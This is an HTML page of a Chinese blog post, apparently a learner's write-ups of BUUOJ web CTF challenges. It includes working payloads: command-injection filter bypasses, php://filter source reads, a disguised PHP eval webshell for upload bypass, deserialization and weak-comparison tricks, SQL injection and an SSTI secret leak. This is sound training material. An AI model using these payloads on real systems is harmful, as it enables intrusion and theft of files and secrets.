@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="color-scheme" content="light dark">
+    <meta name="generator" content="Typst">
+    <title>BUUOJ 之 Web 刷题记 | weyung's Blog</title>
+    <meta name="date" content="2023-09-14">
+    <link rel="canonical" href="https://weyung.cc/posts/8f812862/">
+    <meta property="og:title" content="BUUOJ 之 Web 刷题记 | weyung's Blog">
+    <meta property="og:type" content="article">
+    <meta name="description" content="这学期好像没什么课，就想着学一下 Web ，于是就去 BUUOJ 上刷题了。（copilot 挺懂我）">
+    <meta property="og:description" content="这学期好像没什么课，就想着学一下 Web ，于是就去 BUUOJ 上刷题了。（copilot 挺懂我）">
+    <meta property="og:url" content="https://weyung.cc/posts/8f812862/">
+    <meta name="author" content="weyung">
+    <meta property="article:author" content="weyung">
+    <meta name="twitter:card" content="summary">
+    <meta name="language" content="zh">
+    <link rel="icon" href="/assets/avatar.png">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net">
+    <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+    <script type="text/javascript">
+      (function(){var key='typ-blog-theme';var theme=null;try{var stored=localStorage.getItem(key);if(stored==='gray-10'||stored==='gray-90'||stored==='gray-100'||stored==='white'){theme=stored;}}catch(_){ }if(!theme){theme=window.matchMedia('(prefers-color-scheme: dark)').matches?'gray-90':'gray-10';}document.documentElement.setAttribute('data-theme',theme);var bg=theme==='gray-90'?'#262626':theme==='gray-100'?'#161616':theme==='white'?'#ffffff':'#f4f4f4';document.documentElement.style.backgroundColor=bg;})();
+    </script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-sans@1.1.0/css/ibm-plex-sans-all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-mono@1.1.0/css/ibm-plex-mono-all.min.css">
+    <link rel="stylesheet" href="/assets/core/colors.css">
+    <link rel="stylesheet" href="/assets/core/main.css">
+    <link rel="stylesheet" href="/assets/custom.css">
+    <link rel="stylesheet" href="/assets/custom-toc.css">
+    <script type="module" src="/assets/core/render-code.js"></script>
+    <script type="module" src="/assets/core/theme.js"></script>
+    <script type="module" src="/assets/core/post-nav-switch.js"></script>
+    <script type="module" src="/assets/custom-toc.js"></script>
+  </head>
+  <body>
+    <div class="page-shell">
+      <header>
+        <div class="site-header">
+          <div class="nav-shell">
+            <nav>
+              <button class="nav-menu-switch" type="button" aria-label="打开导航"></button>
+              <div class="nav-title">weyung's Blog</div>
+              <div class="nav-body has-post-title">
+                <div class="nav-body-upper">
+                  <div class="nav-body-upper-title">weyung's Blog</div>
+                  <div class="nav-body-upper-links"><a href="/">首页</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archive/">归档</a><a href="/links/">友链</a><a href="/about/">关于</a></div>
+                </div>
+                <div class="nav-body-lower">BUUOJ 之 Web 刷题记</div>
+              </div>
+              <button class="nav-theme-switch" type="button" aria-label="切换主题"></button>
+            </nav>
+            <div class="nav-sidebar-backdrop"></div>
+            <aside class="nav-sidebar"><a class="nav-sidebar-item" href="/">首页</a><a class="nav-sidebar-item" href="/categories/">分类</a><a class="nav-sidebar-item" href="/tags/">标签</a><a class="nav-sidebar-item" href="/archive/">归档</a><a class="nav-sidebar-item" href="/links/">友链</a><a class="nav-sidebar-item" href="/about/">关于</a></aside>
+          </div>
+        </div>
+      </header>
+      <div class="post-header">
+        <div class="post-header-inner">
+          <h1>BUUOJ 之 Web 刷题记</h1>
+        </div>
+      </div>
+      <article>
+        <section>
+          <h3>前言</h3>
+          <p>其实一开始学 CTF 的时候就想做 Web 了，但是当时密码手快毕业了，密码也简单好学，就先学密码了。 现在密码也学了个半桶水，得着手全栈了。</p>
+          <h3>刷题</h3>
+          <h4>[GXYCTF2019]Ping Ping Ping</h4>
+          <p>题目给出一个 <code class="language-text">?ip=</code>，显然是让我用 <code class="language-text">GET</code> 方法传参，随便传个 <code class="language-text">1</code> 返回的是 ping 的结果，看来是命令执行，我习惯性后面补个 <code class="language-text">&amp;&amp;ls</code>，结果没反应，一看 wp 原来还能用分号的，<code class="language-text">&amp;&amp;</code> 要上一条命令执行成功才会执行下一条，而 <code class="language-text">;</code> 则是不管上一条命令是否成功都会执行下一条，所以这里用 <code class="language-text">;</code> 就行了。</p>
+          <p>然后难点在于正则过滤，<code class="language-text">index.php</code> 内容如下：</p>
+          <pre><code class="language-php">/?ip=
+&lt;pre>PING 1 (0.0.0.1): 56 data bytes
+/?ip=
+&lt;?php
+if(isset($_GET['ip'])){
+  $ip = $_GET['ip'];
+  if(preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
+    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
+    die("fxck your symbol!");
+  } else if(preg_match("/ /", $ip)){
+    die("fxck your space!");
+  } else if(preg_match("/bash/", $ip)){
+    die("fxck your bash!");
+  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
+    die("fxck your flag!");
+  }
+  $a = shell_exec("ping -c 4 ".$ip);
+  echo "&lt;pre>";
+  print_r($a);
+}
+
+?></code></pre>
+          <p>这里过滤了空格和 flag，所以不能直接 <code class="language-text">cat flag.php</code>，wp 的 payload 是</p>
+          <pre><code class="language-bash">?ip=127.0.0.1;cat$IFS$1`ls`</code></pre>
+          <p><code class="language-text">$IFS</code> 是空格，<code class="language-text">$1</code> 是第一个参数，所以这里就是 <code class="language-text">cat flag.php index.php</code>，然后就能看到 flag 了。注意这里的 <code class="language-text">$1</code> 会带出 <code class="language-text">ls</code> 的所有结果而不仅仅是 <code class="language-text">flag.php</code>。所以 <code class="language-text">cat</code> 出来的是目录下所有文件。</p>
+          <p>解法二是 <code class="language-text">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code>，这里的 <code class="language-text">Y2F0IGZsYWcucGhw</code> 是 <code class="language-text">cat flag.php</code> 的 base64 编码，<code class="language-text">-d</code> 是解码，然后传到 <code class="language-text">sh</code> 执行。注意到 <code class="language-text">index.php</code> 只过滤了 <code class="language-text">bash</code>，所以这里可以用 <code class="language-text">sh</code>。</p>
+          <h4>[强网杯 2019]随便注</h4>
+          <p>最头疼的就是这些注入了，没学过 sql 语句，也没学过数据库。</p>
+          <p>随便填个 1 提交后返回</p>
+          <pre><code class="language-sql">array(2) {
+  [0]=>
+  string(1) "1"
+  [1]=>
+  string(7) "hahahah"
+}</code></pre>
+          <p>从网上抄的 <code class="language-text">1' or '1'='1</code> 不管用，有空再回来补。</p>
+          <h4>[SUCTF 2019]EasySQL</h4>
+          <p>抄的 wp：<code class="language-text">\*,1</code>，也不懂，有空补。</p>
+          <h4>[极客大挑战 2019]Secret File</h4>
+          <p>F12 看到</p>
+          <pre><code class="language-html">&lt;a id="master" href="./Archive_room.php" style="background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;">Oh! You found me&lt;/a></code></pre>
+          <p>转到 <code class="language-text">Archive_room.php</code>，有一个按钮指向 <code class="language-text">action.php</code>，点了之后是一个 302 后的 <code class="language-text">end.php</code>。应该是跳到 <code class="language-text">action.php</code> 然后光速重定向到 <code class="language-text">end.php</code>，所以没看到 <code class="language-text">action.php</code> 的内容。 用 burpsuite 抓包，发现 <code class="language-text">action.php</code> 有个 <code class="language-text">secr3t.php</code>，进去后是以下代码</p>
+          <pre><code class="language-php">&lt;html>
+    &lt;title>secret&lt;/title>
+    &lt;meta charset="UTF-8">
+&lt;?php
+    highlight_file(__FILE__);
+    error_reporting(0);
+    $file=$_GET['file'];
+    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
+        echo "Oh no!";
+        exit();
+    }
+    include($file); 
+//flag放在了flag.php里
+?>
+&lt;/html></code></pre>
+          <p>这时候要用 php 伪协议读取 <code class="language-text">flag.php</code>，<code class="language-text">php://filter</code> 是 php 伪协议，<code class="language-text">read=convert.base64-encode/resource=</code> 是 base64 编码，<code class="language-text">flag.php</code> 是要读取的文件，所以这里的 payload 是 <code class="language-text">secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code>，然后把返回的 base64 解码就行了。</p>
+          <h4>[极客大挑战 2019]Http</h4>
+          <p>找到藏着的标签</p>
+          <pre><code class="language-html">&lt;a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围&lt;/a></code></pre>
+          <p>转到 <code class="language-text">Secret.php</code>，按他提示依次改 Referer, User-Agent 和 X-Forwarded-For，然后就能看到 flag 了。改完后如下：</p>
+          <pre><code class="language-yaml">GET /Secret.php HTTP/1.1
+Host: node4.buuoj.cn:25539
+Upgrade-Insecure-Requests: 1
+User-Agent: "Syclover" browser
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Referer: https://Sycsecret.buuoj.cn
+X-Forwarded-For: localhost</code></pre>
+          <h4>[极客大挑战 2019]Knife</h4>
+          <p>蚁剑连上秒了。</p>
+          <h4>[极客大挑战 2019]Upload</h4>
+          <p>考文件上传，只能上传图片，还过滤了 <code class="language-text">&lt;?</code>，新建一个文件写如下内容：</p>
+          <pre><code class="language-html">GIF89a? &lt;script language="php">eval($_REQUEST['a'])&lt;/script></code></pre>
+          <p>然后后缀改成 <code class="language-text">.jpg</code>，上传成功，然后在 burpsuite 把后缀改成 <code class="language-text">.phtml</code> 重发一遍，文件存在了 <code class="language-text">/upload</code> 文件夹，用蚁剑连上去就行了。 或者上传 <code class="language-text">.phtml</code>先，这时上传是失败的的，bp 抓包把 <code class="language-text">Content-Type</code> 改成 <code class="language-text">image/jpeg</code> 重发一遍就行了。</p>
+          <h4>[ACTF2020 新生赛]Upload</h4>
+          <p>和上面的差不多，前端验证后缀，上传个 <code class="language-text">.jpg</code> 然后 bp 改下后缀重发就行。</p>
+          <h4>[极客大挑战 2019]BabySQL</h4>
+          <p>又是 SQL 注入，跳过。</p>
+          <h4>[极客大挑战 2019]PHP</h4>
+          <p>盲猜有个 <code class="language-text">www.zip</code>，下载下来看到 <code class="language-text">unserialize</code>，反序列化的题。</p>
+          <pre><code class="language-php">&lt;?php
+include 'flag.php';
+error_reporting(0);
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+    function __wakeup(){
+        $this->username = 'guest';
+    }
+    function __destruct(){
+        if ($this->password != 100) {
+            echo "&lt;/br>NO!!!hacker!!!&lt;/br>";
+            echo "You name is: ";
+            echo $this->username;echo "&lt;/br>";
+            echo "You password is: ";
+            echo $this->password;echo "&lt;/br>";
+            die();
+        }
+        if ($this->username === 'admin') {
+            global $flag;
+            echo $flag;
+        }else{
+            echo "&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!";
+            die();
+        }
+    }
+}
+?></code></pre>
+          <p>反序列化时会首先执行 <code class="language-text">__wakeup</code>，然后执行 <code class="language-text">__destruct</code>，但是 <code class="language-text">__wakeup</code> 里把 <code class="language-text">username</code> 改成了 <code class="language-text">guest</code>，所以 <code class="language-text">__destruct</code> 里的 <code class="language-text">if ($this->username === 'admin')</code> 正常情况下永远不会成立，所以这里要绕过 <code class="language-text">__wakeup</code>，在反序列化时，当前属性个数大于实际属性个数时，就会跳过 <code class="language-text">__wakeup</code>，但是这个似乎是 PHP 低版本的漏洞，用高版本的 PHP 复现不出来。</p>
+          <pre><code class="language-php">&lt;?php
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+ 
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+}
+$a = new Name('admin', 100);
+$b = urlencode(serialize($a));
+echo $b; 
+?></code></pre>
+          <p>出来一个 <code class="language-text">O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</code>，urlencode 前是 <code class="language-text">O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}</code>，所以把 2 改成 3 就行，最终的 payload 就是 <code class="language-text">?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}</code></p>
+          <h4>[ACTF2020 新生赛]BackupFile</h4>
+          <p>wp 说用 dirsearch 嗯扫，我一通操作发现鸟蛋没扫出来，一看原来已经报 429 Too Many Requests，这 dirsearch 也是个笨比不知道歇会再扫。 总之就是有个 <code class="language-text">index.php.bak</code>，内容如下：</p>
+          <pre><code class="language-php">&lt;?php
+include_once "flag.php";
+
+if(isset($_GET['key'])) {
+    $key = $_GET['key'];
+    if(!is_numeric($key)) {
+        exit("Just num!");
+    }
+    $key = intval($key);
+    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
+    if($key == $str) {
+        echo $flag;
+    }
+}
+else {
+    echo "Try to find out source file!";
+}</code></pre>
+          <p>php 里的 <code class="language-text">==</code> 不要求类型相同，数字和混合字符串比较时，取最前面的一串数字，这里的 <code class="language-text">str</code> 就只取 <code class="language-text">123</code>，所以这里的 payload 是 <code class="language-text">?key=123</code>。</p>
+          <h4>[RoarCTF 2019]Easy Calc</h4>
+          <p>F12 看到说 <code class="language-text">I've set up WAF to ensure security.</code>，WAF 是 Web Application Firewall 的缩写，就是一种防火墙。然后看到计算的过程是用 AJAX 发个包给 <code class="language-text">calc.php</code> 去。直接访问 <code class="language-text">calc.php</code>，内容如下：</p>
+          <pre><code class="language-php">&lt;?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET['num'];
+        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match('/' . $blackitem . '/m', $str)) {
+                        die("what are you want to do?");
+                }
+        }
+        eval('echo '.$str.';');
+}
+?></code></pre>
+          <p>然后发现 num 里面有字母时也会被 WAF 拦下来，比如 <code class="language-text">?num=a</code> 时就不行，这时候就有个骚操作，可以在 <code class="language-text">num</code> 前面加个空格或者 <code class="language-text">+</code>，这样就能绕过 WAF 了，但是 PHP 在解析参数的时候会把空格或者 <code class="language-text">+</code> 去掉。 那么我们 <code class="language-text">? num=var_dump(scandir(chr(47)))</code> 看下目录内容，为了绕过黑名单只能用 ASCII码，<code class="language-text">chr(47)</code> 就是 <code class="language-text">/</code>，也就是相当于 <code class="language-text">ls /</code>，看到有个 <code class="language-text">f1agg</code>，用 <code class="language-text">file_get_contents</code> 读出来就行，payload 为 <code class="language-text">? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code>。</p>
+          <h4>[极客大挑战 2019]BuyFlag</h4>
+          <p>MENU 跳到 <code class="language-text">pay.php</code>，F12 看到源码：</p>
+          <pre><code class="language-php">if (isset($_POST['password'])) {
+    $password = $_POST['password'];
+    if (is_numeric($password)) {
+        echo "password can't be number&lt;/br>";
+    }elseif ($password == 404) {
+        echo "Password Right!&lt;/br>";
+    }
+}</code></pre>
+          <p>又要 password 不是数字，又要 password 是 404，那还是 PHP 的弱类型比较，搞个 <code class="language-text">404a</code> 传过去，发现没反应，根据他的要求再 POST 个 <code class="language-text">money</code> 过去，还是没反应，看 wp 才发现有个 <code class="language-text">user</code> 的 cookie 要改成 1，这时有反应了，说 <code class="language-text">money</code> 太长。 PHP 5.3 有个关于 <code class="language-text">strcmp</code> 的漏洞，就是数据类型不同的时候，<code class="language-text">strcmp</code> 会返回 0，所以这里的 payload 是 <code class="language-text">?password=404a&amp;money[]=1</code>，就是把 <code class="language-text">money</code> 干成数组，就得到 flag了。</p>
+          <h4>[BJDCTF2020]Easy MD5</h4>
+          <p>随便输个 <code class="language-text">1</code>，一看响应头有个 hint：<code class="language-text">Hint: select \* from 'admin' where password=md5($pass,true)</code>，好，那就搞搞 MD5。 首先 MD5 出来的是一个 128 位的散列值，然后 PHP 的 <code class="language-text">md5</code> 函数后面的 <code class="language-text">true</code> 是指返回二进制格式的散列值，但是这个二进制串会进行 ASCII 码转换成字符串，类似 python 里的 <code class="language-text">str(long_to_bytes())</code>。 wp 中选择了 <code class="language-text">ffifdyop</code> 作为 payload，其 MD5 值为 <code class="language-text">276f722736c95d99e921722cf9ed621c</code>，前面的 <code class="language-text">27 6f 72 27 36</code> 对应的字符为 <code class="language-text">'or'6</code>，这样就可以进行一个 SQL 注入，拼凑出 <code class="language-text">select \* from 'admin' where password=''or'6...'</code>，后面还会跟着一堆乱码，但是 <code class="language-text">6...</code> 会被当成数字，所以就一定为真。 然后跳到了 <code class="language-text">levels91.php</code>，F12 看到：</p>
+          <pre><code class="language-php">$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b &amp;&amp; md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.</code></pre>
+          <p><code class="language-text">$GET</code> 感觉是错的，真随意。后面的 if 语句有两种方法绕过，一种是找到两个不同的字符串，其 MD5 值都是 <code class="language-text">0e</code> 后面跟数字，这样的话 PHP 会当成是科学计数法，其值都为 <code class="language-text">0</code>，比如 <code class="language-text">QNKCDZO</code> 和 <code class="language-text">s878926199a</code>，传参进去后出现如下代码：</p>
+          <pre><code class="language-php">&lt;?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+}</code></pre>
+          <p>这里就要用第二种方法了，就是传俩数组进去，<code class="language-text">md5</code> 函数会返回 <code class="language-text">null</code>，然后 <code class="language-text">null</code> 和 <code class="language-text">null</code> 比较时会返回 <code class="language-text">true</code>，而且这个方法刚才也能用，即弱比较和强比较通杀。</p>
+          <h4>[护网杯 2018]easy_tornado</h4>
+          <p>打开一看是个目录，有 <code class="language-text">/flag.txt</code>，<code class="language-text">/welcome.txt</code> 和 <code class="language-text">hints.txt</code>，内容分别为 <code class="language-text">flag in /fllllllllllllag</code>，<code class="language-text">render</code> 和 <code class="language-text">md5(cookie_secret+md5(filename))</code> 打开文件的时候 url 变成了 <code class="language-text">/file?filename=/xxx.txt&amp;filehash=xxx</code>，那我想看 flag 的话应该得搞到 flag 文件的 filehash，那首先得搞到 <code class="language-text">cookie_secret</code>。 题目名字中的 tornado 是一个 Python 的 web 框架，类似 Flask，那么题目是 SSTI 注入，即 Server-Side Template Injection，服务端模板注入。先只传 <code class="language-text">filename</code> 不传 <code class="language-text">filehash</code>，他就急了，网页跳转到 <code class="language-text">/error?msg=Error</code>，网页内容也是 <code class="language-text">Error</code>，那么考虑对 <code class="language-text">msg</code> 进行注入。 小插曲：这时候太困睡觉去了，第二天再来搞这题时 BUU 在维护了，开摆！ <code class="language-text">msg={{1}}</code> 的时候回显 <code class="language-text">1</code> 了，有说法，wp 说 <code class="language-text">cookie_secret</code> 在 <code class="language-text">handler.settings</code>，这时候 <code class="language-text">/error?msg={{handler.settings}}</code> 返回了一串 <code class="language-text">json</code>，其中确实有我们要找的 <code class="language-text">cookie_secret</code>。 在传 <code class="language-text">filehash</code> 的时候一开始只拿 <code class="language-text">fllllllllllllag</code> 去算了，结果不对，还得加上 <code class="language-text">/</code>。</p>
+          <div class="post-meta">
+            <div class="post-tag"><span class="post-tag-desc">标签</span><span class="post-tag-group"><a class="post-tag-item tag-item-with-icon" href="/tags/ctf/" style="--tag-background:var(--tag-background-green);--tag-color:var(--tag-color-green);--tag-background-hover:var(--tag-hover-green);--tag-border:var(--tag-border-green);--tag-border-hover:var(--tag-border-green);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-flag.svg&quot;);"></span><span class="tag-content"><span>CTF</span></span></a><a class="post-tag-item tag-item-with-icon" href="/tags/web/" style="--tag-background:var(--tag-background-purple);--tag-color:var(--tag-color-purple);--tag-background-hover:var(--tag-hover-purple);--tag-border:var(--tag-border-purple);--tag-border-hover:var(--tag-border-purple);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-globe.svg&quot;);"></span><span class="tag-content"><span>Web</span></span></a></span></div>
+            <div class="post-time"><span class="post-time-desc">日期</span><span>2023 年 9 月 14 日</span></div>
+            <div class="post-category"><span class="post-category-desc">分类</span><a class="post-category-link" href="/categories/web/">Web</a></div>
+          </div>
+          <div class="post-license">
+            <div class="post-license-item"><span class="post-license-label">文章作者</span><span>weyung</span></div>
+            <div class="post-license-item"><span class="post-license-label">文章链接</span><a href="https://weyung.cc/posts/8f812862/">https://weyung.cc/posts/8f812862/</a></div>
+            <div class="post-license-item"><span class="post-license-label">许可协议</span><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a></div>
+          </div>
+        </section>
+      </article>
+      <div class="post-neighbors">
+        <div class="post-neighbors-inner"><a class="post-neighbor" href="/posts/5a6b6dd0/"><div class="post-neighbor-top">上一篇</div><p class="post-neighbor-title">日常问题小记</p></a><a class="post-neighbor" href="/posts/59a2e215/"><div class="post-neighbor-top">下一篇</div><p class="post-neighbor-title">2023 BricsCTF - random</p></a></div>
+      </div>
+      <footer>
+        <div class="post-footer">2026 ~ Present Carbon Typst Blog</div>
+      </footer>
+    </div>
+  </body>
+</html>
